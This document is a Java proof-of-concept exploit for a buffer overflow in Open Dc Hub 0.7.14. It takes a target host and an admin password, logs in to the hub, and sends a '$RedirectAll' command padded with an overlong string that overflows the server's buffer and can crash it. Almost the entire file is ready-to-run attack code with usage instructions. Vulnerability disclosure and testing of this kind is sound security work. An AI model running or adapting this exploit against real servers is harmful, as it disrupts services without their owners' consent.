
/* 
   Open Dc Hub (0.7.14) - Buffer Overflow - Proof Of Concept
   Coded by: Donato Ferrante
*/



import java.net.Socket;
import java.net.UnknownHostException;
import java.net.SocketTimeoutException;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintStream;



public class OpenDcHub0714_BOF_poc {


	private static int PORT  = 53696;
	private static int MAXSZ = 512;
        private static String VERSION = "0.1";

	public static void main(String [] args){

	   System.out.println(
			      "\n\n" +
			      "Open Dc Hub - Buffer Overflow - Proof Of Concept\n" +
			      "Version: " + VERSION + "\n"      +
			      "coded by: Donato Ferrante\n"     +
			      "e-mail: fdonato@autistici.org\n" +
			      "web: www.autistici.org/fdonato\n\n"
           );

		if(args.length <= 1){
			System.out.println(
					"Usage: java OpenDcHub0714_BOF_poc <host> <port> <admin_password>\n" +
					"Note:  default port is 53696.\n"
					);
			System.exit(-1);
		}

		String host = args[0];
		String admin_password = args[args.length - 1];
		int port = PORT;

		try{
			if(args.length > 2)
				port = Integer.parseInt(args[1]);
		}catch(Exception e){ port = PORT; }

		try{
		
			Socket socket = new Socket(host, port);
			socket.setSoTimeout(10000);
			BufferedReader in_stream  = new BufferedReader(new InputStreamReader(socket.getInputStream()));
			PrintStream out_stream    = new PrintStream(socket.getOutputStream());

			System.out.println(in_stream.readLine());
			System.out.println(in_stream.readLine());
			System.out.println(in_stream.readLine());
			System.out.println(in_stream.readLine());

			System.out.println("Logging...");
			out_stream.println("$adminpass " + admin_password +"|\n");

			in_stream.readLine();
			String err = in_stream.readLine();

			if(err.toLowerCase().indexOf("bad") >= 0){
				System.out.println("Login failed...");
				System.out.println("Exiting...");
				System.exit(-1);
			}
			else
				System.out.println("Logged in...");

			
			System.out.println("Building test string to inject...");
			String buff = build();
			Thread.sleep(1500);

			System.out.println("Injecting test string...");
			out_stream.println(buff);
			Thread.sleep(1500);

			System.out.println("Proof_Of_Concept terminated.");

		}catch(SocketTimeoutException ste){System.out.println("Socket timeout."); System.exit(-1);}
		 catch(UnknownHostException uhe){ System.out.println("Host: " + host + " unknown.."); System.exit(-1); }
                 catch(InterruptedException ie){ System.out.println("Thread warning...");}
                 catch(Exception ioe){ System.out.println("Unable to create the socket!"); System.exit(-1);}


	}





	private static String build(){

		String over = "";
		for(int i = 0; i < MAXSZ; i++)
			over += 0x61;
		
		String ret = "$RedirectAll " + over + "|\n";
		return ret;
	}


}

